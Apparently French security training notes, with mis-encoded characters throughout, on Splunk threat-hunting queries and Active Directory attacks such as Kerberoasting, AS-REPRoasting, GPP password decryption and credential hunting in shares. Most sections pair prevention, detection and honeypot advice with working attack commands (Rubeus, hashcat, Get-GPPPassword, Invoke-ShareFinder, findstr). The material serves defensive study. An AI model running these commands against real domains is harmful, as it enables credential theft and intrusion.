Le bon Ã©quilibre entre ces deux mÃ©thodes permet une couverture large et efficace. Des ajustements rÃ©guliers des requÃªtes et des seuils sont nÃ©cessaires pour affiner les rÃ©sultats et limiter les faux positifs.

---

## ğŸ” Exemples de Recherches SPL BasÃ©es sur des TTPs Connus

### ğŸ” Reconnaissance via binaires Windows natifs

Les outils comme `ipconfig.exe`, `net.exe`, ou `whoami.exe` sont souvent utilisÃ©s par les attaquants pour lâ€™exploration initiale.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\ipconfig.exe OR Image=*\net.exe OR Image=*\whoami.exe OR Image=*\netstat.exe OR Image=*\nbtstat.exe OR Image=*\hostname.exe OR Image=*\tasklist.exe
| stats count by Image, CommandLine
| sort - count

---

### ğŸŒ TÃ©lÃ©chargement malveillant depuis des domaines rÃ©putÃ©s (ex: GitHub)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="*github*"
| stats count by Image, QueryName

---

### âš™ï¸ Utilisation suspecte de PsExec

**Cas 1 â€“ Ã‰criture dans la base de registre :**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\Windows\system32\services.exe" TargetObject="HKLM\System\CurrentControlSet\Services\*\ImagePath"
| rex field=Details "(?<reg_file_name>[^\\]+)$"
| eval file_name = if(isnull(file_name),reg_file_name,lower(file_name))
| stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName

**Cas 2 â€“ Fichiers suspects (Event ID 11)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System
| stats count by TargetFilename

**Cas 3 â€“ Nom de pipe inter-process suspect (Event ID 18)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System
| stats count by PipeName

---

### ğŸ“¦ Utilisation dâ€™archives pour lâ€™exfiltration ou le transfert

index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z")
| stats count by ComputerName, User, TargetFilename
| sort - count

---

### ğŸ“¥ TÃ©lÃ©chargements via PowerShell ou Edge

**PowerShell**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*"
| stats count by Image, TargetFilename
| sort + count

**Microsoft Edge (Zone.Identifier)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier"
| stats count by TargetFilename
| sort + count

---

### ğŸš« ExÃ©cution depuis des emplacements inhabituels

index="main" EventCode=1
| regex Image="C:\\Users\\.*\\Downloads\\.*"
| stats count by Image

---

### â— ExÃ©cutables crÃ©Ã©s hors du rÃ©pertoire Windows

index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\windows\*"
| stats count by User, TargetFilename
| sort + count

---

### âœï¸ DÃ©tection de binaires mal orthographiÃ©s (ex: psexe au lieu de PsExec)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
(CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe"))
OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe"))
OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe"))
OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe"))
| table Image, CommandLine, ParentImage, ParentCommandLine

---

### ğŸ“¡ Ports non standards (commandes ou tunnels suspects)

index="main" EventCode=3
NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21)
| stats count by SourceIp, DestinationIp, DestinationPort
| sort - count

---
```

## **Detecting Attacker Behavior With Splunk Based On Analytics**

```jsx

---

### DÃ©tection d'anomalies dans Splunk : Identifier les comportements inhabituels

Dans le domaine de la cybersÃ©curitÃ©, la dÃ©tection basÃ©e sur les anomalies est essentielle pour identifier des comportements suspects qui Ã©chappent aux mÃ©thodes classiques fondÃ©es sur les TTP (Tactics, Techniques, and Procedures). En profilant lâ€™activitÃ© normale dâ€™un systÃ¨me, Splunk permet, grÃ¢ce Ã  des commandes statistiques comme `streamstats`, de repÃ©rer les Ã©carts significatifs qui pourraient indiquer une compromission.

---

#### **Exemple 1 : DÃ©tection de connexions rÃ©seau anormales avec `streamstats`**

Cette requÃªte surveille la frÃ©quence des connexions rÃ©seau par processus. Elle signale ceux qui dÃ©passent un seuil statistique basÃ© sur leur comportement historique.

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=3
| bin _time span=1h
| stats count as NetworkConnections by _time, Image
| streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image
| eval isOutlier=if(NetworkConnections > (avg + 0.5 * stdev), 1, 0)
| search isOutlier=1

**Explication** :

* `streamstats` calcule la moyenne et lâ€™Ã©cart-type glissants sur 24h.
* Un processus est signalÃ© sâ€™il dÃ©passe la moyenne de plus de 0,5 Ã©cart-type.

---

#### **Exemple 2 : DÃ©tection de commandes anormalement longues**

Des lignes de commande trÃ¨s longues peuvent indiquer des tentatives dâ€™Ã©vasion ou dâ€™obfuscation.

spl
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Pour affiner les rÃ©sultats, on peut exclure les processus parent bÃ©nins :

spl
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe 
ParentImage!="*msiexec.exe" ParentImage!="*explorer.exe"
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

---

#### **Exemple 3 : ActivitÃ© inhabituelle de cmd.exe par utilisateur**

Ce cas dÃ©tecte une augmentation soudaine de lâ€™utilisation de cmd.exe pour un utilisateur donnÃ©.

spl
index="main" EventCode=1 (CommandLine="*cmd.exe*")
| bucket _time span=1h
| stats count as cmdCount by _time User CommandLine
| eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev
| eval isOutlier=if(cmdCount > avg + 1.5 * stdev, 1, 0)
| search isOutlier=1

---

#### **Exemple 4 : Chargement rapide de nombreuses DLLs**

Une activitÃ© malveillante peut charger plusieurs DLLs en peu de temps. Cette requÃªte identifie les processus impliquÃ©s :

spl
index="main" EventCode=7 
NOT (Image="C:\Windows\System32*") NOT (Image="C:\Program Files*")
| bucket _time span=1h
| stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image
| where unique_dlls_loaded > 3
| stats count by Image, unique_dlls_loaded
| sort - unique_dlls_loaded

---

#### **Exemple 5 : ExÃ©cutions multiples dâ€™un mÃªme processus sur un hÃ´te**

Des exÃ©cutions rÃ©pÃ©tÃ©es peuvent trahir des activitÃ©s suspectes :

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| stats count by Image, ParentImage

Pour cibler des cas particuliers, comme `rundll32.exe` exÃ©cutÃ© par `svchost.exe` :

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) > 1
| search Image="C:\Windows\System32\rundll32.exe" ParentImage="C:\Windows\System32\svchost.exe"
| table CommandLine, ParentCommandLine

```

## **Windows Attacks & Defense**

## Kerberoasting

```jsx

---

## ğŸ“Œ **Kerberoasting dans Active Directory â€“ Explication, Attaque, PrÃ©vention et DÃ©tection**

### ğŸ” **Qu'est-ce qu'un SPN ?**

Un **Service Principal Name (SPN)** est un identifiant unique utilisÃ© par Kerberos pour authentifier un service sans avoir besoin de connaÃ®tre le nom de compte du service. Lorsquâ€™un ticket TGS (Ticket Granting Service) est demandÃ©, il est chiffrÃ© avec le hash NTLM du compte de service.

---

### ğŸ¯ **Kerberoasting : Principe de lâ€™attaque**

**Kerberoasting** est une technique post-exploitation. Elle consiste Ã  :

1. **RÃ©cupÃ©rer les tickets TGS** de services (associÃ©s aux SPNs).
2. **Les cracker hors ligne** afin de retrouver le mot de passe du compte de service.

Lâ€™attaque est dâ€™autant plus efficace si :

* Le mot de passe du compte est faible.
* Le ticket utilise un algorithme de chiffrement vulnÃ©rable.

#### ğŸ” Algorithmes de chiffrement utilisÃ©s :

* **AES** : trÃ¨s sÃ©curisÃ©, difficile Ã  cracker.
* **RC4** : frÃ©quemment vulnÃ©rable.
* **DES** : obsolÃ¨te, rarement utilisÃ© aujourdâ€™hui.

MalgrÃ© les recommandations de sÃ©curitÃ©, **RC4 et DES** sont encore prÃ©sents dans certains environnements.

---

### ğŸ§¨ **Chemin d'attaque**

#### 1. **Extraction des tickets TGS**

Avec des outils comme **Rubeus**, un attaquant peut extraire les tickets Kerberos liÃ©s aux comptes SPN :

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
```

> Les tickets sont enregistrÃ©s dans `spn.txt`.

#### 2. **Crackage des tickets**

Les hashes extraits sont ensuite transfÃ©rÃ©s sur un outil comme **Hashcat** (Linux/Kali) pour tentative de bruteforce :

```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

* `-m 13100` : mode Hashcat pour Kerberoasting.
* `passwords.txt` : dictionnaire de mots de passe.
* RÃ©sultat : les mots de passe de comptes de service sont rÃ©vÃ©lÃ©s en clair.

```bash
cat cracked.txt
```

---

### ğŸ›¡ï¸ **PrÃ©vention**

Pour contrer cette attaque :

* ğŸ”’ **Mots de passe robustes** : longs et complexes (idÃ©alement > 100 caractÃ¨res).
* ğŸ§¹ **Limiter les comptes SPN** : supprimer les SPN inutilisÃ©s.
* ğŸ”„ **Utiliser les GMSA** *(Group Managed Service Accounts)* : mots de passe gÃ©rÃ©s et renouvelÃ©s automatiquement.

---

### ğŸ•µï¸â€â™‚ï¸ **DÃ©tection**

Chaque demande de TGS gÃ©nÃ¨re un **Ã©vÃ©nement Windows ID 4769**. Bien quâ€™il soit difficile de tout surveiller, certains comportements sont suspects :

* â— **Tickets RC4** : si lâ€™environnement est censÃ© utiliser uniquement AES, alerter sur tout ticket RC4.
* ğŸ“ˆ **Volume anormal de requÃªtes TGS** : surtout depuis un seul poste ou utilisateur.
* ğŸ£ **Comptes honeypot** : crÃ©er un faux compte avec un SPN, inactif mais attirant. Toute requÃªte Ã  ce compte est suspecte.

---

### ğŸ­ **CrÃ©ation dâ€™un compte honeypot**

CritÃ¨res pour un compte leurre efficace :

* ğŸ‘¤ **Ancien compte** : inactif depuis > 2 ans.
* ğŸ” **Mot de passe incassable**.
* ğŸ§¾ **SPN rÃ©aliste** : liÃ© Ã  un service comme IIS ou SQL.

**Exemple** :

```text
Nom du compte : svc-iam
SPN attribuÃ© : HTTP/svc-iam.domain.local
```

---

### âš ï¸ **Remarque importante**

Multiplier les honeypots peut rendre leur prÃ©sence dÃ©tectable. Il est donc crucial dâ€™adapter ces techniques Ã  votre environnement, en combinant sÃ©curitÃ© et discrÃ©tion.

---

```

## AS-REProasting

```jsx

---

## ğŸ” **AS-REPRoasting dans Active Directory â€“ Description, Attaque, PrÃ©vention et DÃ©tection**

### ğŸ“Œ **Qu'est-ce que l'AS-REPRoasting ?**

L'attaque **AS-REPRoasting** est similaire au Kerberoasting. Elle cible les comptes utilisateurs configurÃ©s sans prÃ©-authentification Kerberos (option **"Do not require Kerberos preauthentication"**). Cette configuration permet aux attaquants de rÃ©cupÃ©rer des **hashs Kerberos crackables** sans interaction avec le mot de passe du compte.

Le succÃ¨s de lâ€™attaque dÃ©pend principalement de la **robustesse du mot de passe** du compte ciblÃ©.

---

### ğŸ§¨ **Ã‰tapes de lâ€™attaque**

#### 1. **Extraction des hashs AS-REP**

Ã€ lâ€™aide dâ€™outils comme **Rubeus**, les attaquants extraient les hashs des comptes vulnÃ©rables :

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
```

> Les hashs sont enregistrÃ©s dans le fichier `asrep.txt`.

#### 2. **PrÃ©paration du hash pour cracking**

Avant le bruteforce, le hash doit Ãªtre formatÃ© pour Hashcat. Il faut sâ€™assurer que le hash commence par :

```
$krb5asrep$23$...
```

Exemple :

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
```

#### 3. **Crackage avec Hashcat**

Utilisation de **Hashcat** en mode **18200**, spÃ©cialement conÃ§u pour les hashs AS-REP :

```bash
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```

#### 4. **Affichage des rÃ©sultats**

Une fois le mot de passe trouvÃ©, lâ€™ouvrir en clair :

```bash
cat asrepcrack.txt
```

---

### ğŸ›¡ï¸ **PrÃ©vention**

La sÃ©curitÃ© repose principalement sur la **configuration des comptes** et la **politique de mot de passe**.

* ğŸ” **RÃ©vision rÃ©guliÃ¨re** : DÃ©sactivez lâ€™option *"no preauthentication"* sauf si elle est strictement nÃ©cessaire. Faites des audits trimestriels pour dÃ©tecter toute mauvaise configuration.
* ğŸ”’ **Politique de mot de passe renforcÃ©e** : Imposer une longueur minimale de 20 caractÃ¨res pour les comptes sans prÃ©-authentification.

---

### ğŸ•µï¸â€â™‚ï¸ **DÃ©tection**

Lorsquâ€™un **TGT** est demandÃ©, lâ€™**Ã©vÃ©nement Windows ID 4768** est gÃ©nÃ©rÃ©. Bien que courant, il est possible de dÃ©tecter des comportements suspects en :

* ğŸ“ **CorrÃ©lant les IP/VLAN** : Identifier les sources inhabituelles de requÃªtes.
* ğŸ“Š **Analyse comportementale** : Surveiller les requÃªtes frÃ©quentes sur un mÃªme compte ou depuis des adresses inconnues.

---

### ğŸ£ **DÃ©ploiement dâ€™un compte honeypot**

Un **compte honeypot** bien configurÃ© peut attirer et identifier les attaques AS-REPRoasting. Il doit rÃ©pondre Ã  certains critÃ¨res :

* ğŸ•°ï¸ **Ancien compte** : Inactif depuis longtemps, avec un mot de passe jamais changÃ©.
* ğŸ‘£ **Connexion rÃ©cente** : Doit apparaÃ®tre actif pour paraÃ®tre lÃ©gitime.
* ğŸ› ï¸ **PrivilÃ¨ges assignÃ©s** : Assez de droits pour attirer lâ€™attention des attaquants.
* âš™ï¸ **PrÃ©-authentification dÃ©sactivÃ©e** : Condition nÃ©cessaire pour lâ€™attaque.

**Exemple** :

```
Nom du compte : svc-iam  
Configuration : privilÃ¨ges Ã©levÃ©s, prÃ©-authentification Kerberos dÃ©sactivÃ©e
```

---

### âš ï¸ **Conseil de prudence**

Ã‰vitez de surutiliser les honeypots, au risque de crÃ©er des schÃ©mas dÃ©tectables par les attaquants. SÃ©lectionnez les mÃ©thodes de dÃ©tection les plus adaptÃ©es Ã  votre environnement pour Ã©quilibrer efficacitÃ© et discrÃ©tion.

---

```

## GPP Passwords

```jsx

---

## ğŸ” **Exploitation des mots de passe GPP dans SYSVOL â€“ Description, Attaque, PrÃ©vention et DÃ©tection**

### ğŸ“Œ **Quâ€™est-ce que SYSVOL ?**

**SYSVOL** est un partage rÃ©seau prÃ©sent sur tous les **Domain Controllers (DC)**, contenant :

* Scripts de connexion,
* DonnÃ©es de stratÃ©gies de groupe (GPO),
* Et d'autres fichiers essentiels Ã  lâ€™environnement Active Directory.

Les stratÃ©gies de groupe sont stockÃ©es ici :

```
\\<DOMAINE>\SYSVOL\<DOMAINE>\Policies\
```

Avec **Windows Server 2008**, les **Group Policy Preferences (GPP)** ont introduit la possibilitÃ© dâ€™enregistrer des **identifiants** dans certains fichiers XML. Ces identifiants incluent un mot de passe chiffrÃ© avec une clÃ© qui a Ã©tÃ© **rendue publique par Microsoft**, ce qui rend possible leur dÃ©chiffrement par tout utilisateur authentifiÃ© du domaine.

---

### ğŸ¯ **ScÃ©nario dâ€™attaque**

#### 1. **Extraction et dÃ©chiffrement des mots de passe GPP**

GrÃ¢ce Ã  des outils comme **PowerSploit**, un attaquant peut rechercher les fichiers XML contenant le champ **`cpassword`**, et les dÃ©crypter Ã  lâ€™aide de la clÃ© publiÃ©e :

```powershell
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

**Exemple de rÃ©sultat :**

```
UserName  : svc-iis  
Password  : abcd@123  
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml  
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80  
```

> Le mot de passe est visible en clair aprÃ¨s dÃ©chiffrement.

---

### ğŸ›¡ï¸ **PrÃ©vention**

* ğŸ›  **Mise Ã  jour critique** : Microsoft a publiÃ© **KB2962486 (2014)** pour dÃ©sactiver la possibilitÃ© dâ€™enregistrer de nouveaux mots de passe dans les GPP.
  âš  **Attention** : cette mise Ã  jour **ne supprime pas** les anciens mots de passe dÃ©jÃ  prÃ©sents.

* ğŸ” **Audit rÃ©gulier** : Dans les environnements mis en place avant 2014, il est impÃ©ratif de vÃ©rifier que **plus aucun mot de passe nâ€™est exposÃ©** dans SYSVOL.

---

### ğŸ•µï¸â€â™‚ï¸ **DÃ©tection**

#### 1. **Surveillance des accÃ¨s aux fichiers XML contenant `cpassword`**

* Activez lâ€™audit sur les dossiers GPP contenant des fichiers sensibles.
* Chaque accÃ¨s gÃ©nÃ¨re un **Ã©vÃ©nement 4663**, utile pour identifier des lectures non lÃ©gitimes.

#### 2. **Tentatives de connexion avec les identifiants exposÃ©s**

* Surveillez les connexions avec les comptes exposÃ©s, notamment :

  * **4624** â€“ Connexion rÃ©ussie
  * **4625** â€“ Ã‰chec de connexion
  * **4768** â€“ RequÃªte de ticket Kerberos (TGT)

> Une connexion rÃ©ussie depuis une machine inattendue est un **indicateur fort dâ€™abus**.

---

### ğŸ£ **DÃ©ploiement dâ€™un compte honeypot**

La mise en place dâ€™un **faux compte de service** dans un fichier GPP peut piÃ©ger les attaquants.

#### CritÃ¨res pour un compte honeypot efficace :

* ğŸ”’ **Mot de passe invalide** : Lâ€™identifiant affichÃ© est incorrect ou dÃ©suet.
* ğŸ•°ï¸ **AnciennetÃ© apparente** : La date de dernier changement de mot de passe prÃ©cÃ¨de la derniÃ¨re modification du fichier XML.
* ğŸ‘£ **Simulation dâ€™activitÃ©** : Une tÃ¢che planifiÃ©e bidon simule des connexions rÃ©guliÃ¨res.

> Toute tentative de connexion rÃ©elle Ã  ce compte (en dehors du script simulÃ©) dÃ©clenche une alerte.

#### Ã‰vÃ©nements Ã  surveiller :

* **4625** â€“ Ã‰chec de connexion
* **4771** â€“ Ã‰chec dâ€™authentification Kerberos
* **4776** â€“ Ã‰chec dâ€™authentification NTLM

---

### âš ï¸ **Remarque stratÃ©gique**

Lâ€™usage excessif de leurres trop Ã©vidents peut trahir vos mÃ©canismes de dÃ©tection. Adaptez vos honeypots avec rÃ©alisme et discrÃ©tion pour maximiser leur efficacitÃ© sans Ã©veiller les soupÃ§ons.

---

```

## GPO Permissions/GPO Files

```jsx

---

## ğŸ› ï¸ **Abus des GPO dans Active Directory â€“ Description, Attaque, PrÃ©vention et DÃ©tection**

### ğŸ“Œ **Quâ€™est-ce quâ€™un GPO ?**

Un **Group Policy Object (GPO)** est un ensemble de configurations appliquÃ©es Ã  des objets Active Directory (utilisateurs, ordinateurs) via des **UnitÃ©s dâ€™Organisation (OU)**. Chaque GPO a un **nom unique** et peut Ãªtre filtrÃ© par :

* Groupes de sÃ©curitÃ© (ex. : Domain Users),
* Filtres WMI,
* OU spÃ©cifiques.

> Par dÃ©faut, seuls les **Domain Admins** et rÃ´les privilÃ©giÃ©s peuvent modifier un GPO. Mais des dÃ©lÃ©gations spÃ©cifiques peuvent Ã©tendre ces droits Ã  des utilisateurs moins privilÃ©giÃ©s.

---

### ğŸ¯ **Vecteurs dâ€™attaque GPO**

Un attaquant ayant accÃ¨s Ã  un compte compromis **avec droits dâ€™Ã©dition** sur un GPO peut :

* ğŸ§¾ **Ajouter des scripts de dÃ©marrage**, tÃ¢ches planifiÃ©es ou logiciels malveillants.
* ğŸ¯ **Cibler les objets** dans lâ€™OU liÃ©e au GPO, compromettant ainsi plusieurs machines.

Un autre vecteur courant est lâ€™exploitation de **partages rÃ©seau mal configurÃ©s** contenant des fichiers utilisÃ©s par des GPOs (ex. : scripts ou exÃ©cutables). Si les **droits NTFS** permettent l'Ã©criture, lâ€™attaquant peut **remplacer un fichier lÃ©gitime par un fichier malveillant**, mÃªme si le GPO est intact.

---

### ğŸ§¨ **Exploitation des permissions GPO**

#### Attaque directe :

* Modifier un GPO vulnÃ©rable (permissions trop larges).
* Ajouter un script ou un exÃ©cutable malveillant.

#### Attaque indirecte :

* Identifier un GPO utilisant un fichier sur un **partage modifiable**.
* Remplacer ce fichier par une version malveillante.

---

### ğŸ›¡ï¸ **PrÃ©vention**

âœ… **Restreindre strictement les permissions GPO** :

* Limiter les droits de modification Ã  une **liste de comptes de confiance**.

ğŸ” **Revue rÃ©guliÃ¨re des GPOs** :

* Mettre en place une **vÃ©rification horaire automatisÃ©e** des permissions GPO.
* DÃ©tecter tout Ã©cart par rapport aux configurations prÃ©vues.

ğŸ“‚ **SÃ©curiser les partages rÃ©seau** :

* Ne jamais utiliser de fichiers GPO hÃ©bergÃ©s sur des partages accessibles en Ã©criture Ã  plusieurs utilisateurs.

---

### ğŸ•µï¸â€â™‚ï¸ **DÃ©tection**

#### ğŸ” **Modification dâ€™un GPO**

Activez lâ€™**audit des modifications dâ€™annuaire** pour capturer lâ€™Ã©vÃ©nement suivant :

* **Event ID 5136** : signale une modification dâ€™objet, y compris de GPO.

> Toute modification faite par un utilisateur non autorisÃ© doit gÃ©nÃ©rer une alerte immÃ©diate.

---

### ğŸ£ **Honeypot GPO**

Une stratÃ©gie avancÃ©e de dÃ©tection consiste Ã  crÃ©er un **GPO leurre** configurÃ© pour attirer un attaquant.

#### âš™ï¸ **Conditions pour un honeypot GPO efficace :**

* LiÃ© Ã  des serveurs non critiques.
* Suivi **automatisÃ© et en temps rÃ©el** des modifications.
* **DÃ©sactivation automatique** en cas de dÃ©tection d'altÃ©ration.

#### ğŸ”„ **Script de dÃ©tection automatique (PowerShell)**

Ce script PowerShell surveille un GPO honeypot spÃ©cifique et **dÃ©sactive tout utilisateur lâ€™ayant modifiÃ©** :

```powershell
# PÃ©riode de surveillance : 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Recherche des Ã©vÃ©nements 5136 liÃ©s au GPO cible
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody += "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Envoi dâ€™un e-mail dâ€™alerte (Ã  complÃ©ter avec Send-MailMessage)
    $emailBody
}
```

> Une dÃ©sactivation dÃ©clenche **l'Ã©vÃ©nement 4725**, indiquant quâ€™un compte a Ã©tÃ© dÃ©sactivÃ©.

---

### âš ï¸ **Recommandations stratÃ©giques**

Les honeypots GPO doivent Ãªtre utilisÃ©s dans des **environnements matures**, dotÃ©s de capacitÃ©s de dÃ©tection et de rÃ©ponse rapide. Mal utilisÃ©s, ils peuvent devenir Ã©vidents pour les attaquants.

---

```

## Credentials in Shares

```jsx
### **Exposition des Identifiants dans les Partages RÃ©seau â€“ Description, Attaque, PrÃ©vention et DÃ©tection**

#### **Contexte : Exposition des Identifiants sur les Partages RÃ©seau**

Lâ€™exposition des **identifiants dans les partages rÃ©seau** est lâ€™une des **mauvaise configuration les plus courantes** rencontrÃ©es dans Active Directory. Bien que ces erreurs surviennent frÃ©quemment dans les grandes entreprises, elles peuvent aussi affecter des petites structures. Ce phÃ©nomÃ¨ne ressemble Ã  une Ã©volution de la problÃ©matique des mots de passe laissÃ©s sur des post-its, en passant Ã  Â« ne laissez pas de **identifiants non chiffrÃ©s** et de **tokens d'autorisation** Ã©parpillÃ©s sur le rÃ©seau Â».

Les identifiants peuvent Ãªtre trouvÃ©s dans des **scripts** et **fichiers de configuration** sur des partages rÃ©seau (ex. : scripts batch, cmd, PowerShell, fichiers ini et config). Par contraste, les identifiants stockÃ©s sur les machines locales des utilisateurs se trouvent souvent dans des **fichiers texte**, **Excel** ou **Word**. Toutefois, la diffÃ©rence majeure rÃ©side dans le fait que les **partages rÃ©seau** reprÃ©sentent un **risque beaucoup plus Ã©levÃ©** en raison de leur accessibilitÃ© potentielle pour **tous les utilisateurs**.

#### **Pourquoi les Partages RÃ©seau sont-ils ExposÃ©s ?**

Il existe plusieurs raisons pour lesquelles un partage rÃ©seau devient accessible Ã  tous :

1. **AccÃ¨s trop large Ã  un partage initialement sÃ©curisÃ©** :
   Un administrateur crÃ©e un partage avec des restrictions appropriÃ©es, mais d'autres administrateurs finissent par Ã©tendre l'accÃ¨s Ã  "Tout le monde" (groupe "Users"), donnant ainsi accÃ¨s Ã  tous les utilisateurs du domaine.

2. **Mauvaise gestion des partages de scripts** :
   Parfois, un administrateur crÃ©e un rÃ©pertoire pour tester des scripts sur le \**C:\** ou dans un autre rÃ©pertoire partagÃ©, mais oublie de restreindre lâ€™accÃ¨s, exposant ainsi des informations sensibles.

3. **Partages ouverts par nÃ©gligence** :
   Certains partages peuvent Ãªtre laissÃ©s ouverts aprÃ¨s une utilisation temporaire pour transfÃ©rer des fichiers ou installer des logiciels, puis ne sont pas fermÃ©s aprÃ¨s lâ€™utilisation.

4. **Partages cachÃ©s mal compris** :
   Les partages cachÃ©s (nom de dossier se terminant par "\$") ne sont pas affichÃ©s dans lâ€™**Explorateur Windows**. Cependant, dâ€™autres outils (comme **PowerShell** ou **Command Prompt**) peuvent y accÃ©der et y trouver des informations sensibles.

#### **Attaque**

L'attaque commence par l'identification des **partages rÃ©seau accessibles** au sein du domaine. Des outils comme **Invoke-ShareFinder** de **PowerView** permettent de lister tous les partages disponibles et de vÃ©rifier les accÃ¨s en fonction des permissions de l'utilisateur.

**Exemple dâ€™utilisation de PowerView :**

```powershell
PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

**Exemple de sortie :**

```plaintext
\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\Server01.eagle.local\dev$     -
```

L'attaquant peut alors rechercher des **mots clÃ©s** comme "pass", "username", ou "password" dans les fichiers partagÃ©s Ã  lâ€™aide de la commande **findstr** (outil intÃ©grÃ© dans Windows) :

**Commande PowerShell :**

```powershell
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
```

#### **PrÃ©vention**

La meilleure faÃ§on de prÃ©venir cette attaque est de **verrouiller l'accÃ¨s Ã  tous les partages rÃ©seau** dans le domaine. Il est essentiel dâ€™effectuer des **analyses rÃ©guliÃ¨res** (hebdomadaires) pour dÃ©tecter tout nouveau partage ouvert ou toute information sensible exposÃ©e dans un ancien partage.

1. **Limiter les permissions sur les partages** : Restreindre l'accÃ¨s Ã  **seulement les utilisateurs nÃ©cessaires**.
2. **Audits rÃ©guliers** : Planifier des scans frÃ©quents des partages rÃ©seau pour vÃ©rifier leur sÃ©curitÃ©.
3. **Utilisation de partages sÃ©curisÃ©s** : Ã‰viter dâ€™utiliser des partages qui peuvent Ãªtre modifiÃ©s par des utilisateurs non autorisÃ©s.

#### **DÃ©tection**

La dÃ©tection d'une exploitation des identifiants exposÃ©s sur les partages se base sur lâ€™analyse du comportement des utilisateurs et la surveillance des Ã©vÃ©nements associÃ©s Ã  lâ€™utilisation des identifiants compromis.

**Ã‰vÃ©nements clÃ©s Ã  surveiller** :

* **Event ID 4624** : Connexion rÃ©ussie (connexion avec des identifiants exposÃ©s).
* **Event ID 4768** : RequÃªte de ticket TGT (Kerberos).

Analyser les connexions suspectes ou provenant de lieux inhabituels peut permettre de repÃ©rer une exploitation des identifiants.

#### **Honeypot**

Une stratÃ©gie efficace pour dÃ©tecter lâ€™exploitation des identifiants sur les partages consiste Ã  crÃ©er un **compte honeypot** dans Active Directory.

**Configuration idÃ©ale pour un compte honeypot** :

* Un compte de service crÃ©Ã© il y a **plus de 2 ans**, avec un mot de passe **non modifiÃ© depuis au moins un an**.
* Ce compte doit Ãªtre encore **actif** dans l'environnement, mais la **mauvaise configuration de son mot de passe** entraÃ®nera principalement des tentatives de **connexion Ã©chouÃ©es**.

**Ã‰vÃ©nements associÃ©s Ã  un compte honeypot** :

* **4625** : Tentative de connexion Ã©chouÃ©e.
* **4771** : Ã‰chec de l'authentification Kerberos.
* **4776** : Ã‰chec de l'authentification NTLM.

Le suivi de ces tentatives peut alerter les administrateurs en cas de compromission des identifiants.

---

```

## Credentials in Object Properties

```jsx
### **Exposition des Identifiants dans les PropriÃ©tÃ©s des Objets Active Directory â€“ Description, Attaque, PrÃ©vention et DÃ©tection**

#### **Contexte : Storing Credentials in Object Properties in Active Directory**

Dans **Active Directory**, chaque objet possÃ¨de de nombreuses propriÃ©tÃ©s, telles que :

* Lâ€™Ã©tat du compte (actif/inactif),
* La date dâ€™expiration du compte,
* La date de la derniÃ¨re modification du mot de passe,
* Le nom du compte,
* La localisation de lâ€™employÃ©, son numÃ©ro de tÃ©lÃ©phone, etc.

